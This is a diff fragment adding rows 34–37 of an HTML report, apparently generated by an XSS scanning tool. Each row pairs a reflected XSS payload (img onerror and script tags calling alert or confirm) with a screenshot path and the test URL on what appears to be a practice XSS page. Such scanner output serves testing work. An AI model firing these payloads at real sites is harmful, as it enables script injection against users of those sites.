+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>34</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_54_2_76.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerror=alert(&#39;XSS&#39;);></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;>&lt;img src=x onerror=alert(&#39;XSS&#39;);>'>https://brutelogic.com.br/xss.php/&quot;&gt;&lt;img src=x onerror=alert(&#39;XSS&#39;);&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>35</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_54_2_148.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=1 onerror=alert(1)>.gif</td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;>&lt;img src=1 onerror=alert(1)>.gif'>https://brutelogic.com.br/xss.php/&quot;&gt;&lt;img src=1 onerror=alert(1)&gt;.gif</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>36</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_54_2_417.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;/>&lt;script>+-+-1-+-+confirm(1)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/&quot;/>&lt;script>+-+-1-+-+confirm(1)&lt;/script>'>https://brutelogic.com.br/xss.php/&quot;/&gt;&lt;script&gt;+-+-1-+-+confirm(1)&lt;/script&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>37</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_54_2_721.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%20&quot;>&lt;img src=q onerror=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='https://brutelogic.com.br/xss.php/%20&quot;>&lt;img src=q onerror=alert(1)>'>https://brutelogic.com.br/xss.php/%20&quot;&gt;&lt;img src=q onerror=alert(1)&gt;</a></td>
+                </tr>
+            </tbody>
+                    </table>
+                    <div id='modal' class='modal'>
+                        <span class='close'>&times;</span>
+                        <img class='modal-content' id='modal-image'>
+                        <div id='caption'></div>
+                    </div>
+                </body>
+                </html>
+            
